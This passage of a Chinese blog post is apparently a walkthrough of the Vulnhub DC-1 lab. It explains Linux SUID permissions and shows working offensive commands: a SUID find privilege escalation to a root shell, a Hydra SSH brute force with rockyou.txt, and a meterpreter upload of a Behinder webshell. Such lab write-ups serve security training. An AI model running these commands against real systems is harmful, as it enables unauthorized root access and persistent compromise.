+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5ac4602b14c6">linux 提权-SUID提权 - 简书 (jianshu.com)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">(4条消息) Linux下用SUID提权_谢公子的博客-CSDN博客 suid提权</a></p>
+</blockquote>
+<p><strong>什么是SUID？</strong></p>
+<p>SUID (Set UID) 是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p>
+<p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限。</p>
+<p><img src="https://img-blog.csdnimg.cn/a21acef9394946e684c2f109744486a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASWVya2VV,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找具有root权限的SUID的文件</span><br><span class="hljs-meta">#</span><span class="bash"> 可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</span><br>www-data@DC-1:/home/flag4$ find / -perm -u=s -type f 2&gt;/dev/null<br><br>www-data@DC-1:/home/flag4$ ls -al /usr/bin/find<br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查找根目录下名为 thefinalflag.txt 的文件并执行 shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> 参数后面跟的是<span class="hljs-built_in">command</span>命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span><br>www-data@DC-1:/var/www$ find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;    <br>find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>id<br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thefinalflag.txt</span>                                <br>cat /root/thefinalflag.txt<br>Well done!!!!<br><br>Hopefully you&#x27;ve enjoyed this and learned some new skills.<br><br>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、CMS：Drupal 7 配置文件、密码加密方式及其相关漏洞</p>
+<p>2、msf</p>
+<p>3、数据库</p>
+<p>4、SUID 提权</p>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>爆破 SSH：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -l 指定破解的用户	-P 指定密码字典	ssh://ip 指定使用协议和ip地址</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt 192.168.135.147 ssh</span><br><span class="hljs-meta">#</span><span class="bash"> 或者</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.135.147</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 使用得到用户名密码【flag4/orange】, 远程连接靶机</span><br><span class="hljs-meta">$</span><span class="bash"> ssh flag4@192.168.135.147</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br><span class="hljs-meta">$</span><span class="bash"> cat flag4.txt</span><br></code></pre></td></tr></table></figure>
+<p><strong>上传冰蝎马获取 shell</strong>：</p>
+<p>利用 meterperter 的 shell 直接上传冰蝎的 shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterperter&gt; upload /home/kali/Desktop/shell.php /var/www/shell.php<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Raven：1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/11/Code/Python/Python%E5%88%B6%E4%BD%9CHTML%E6%8A%A5%E5%91%8A/">
+                        <span class="hidden-mobile">Python制作HTML报告</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
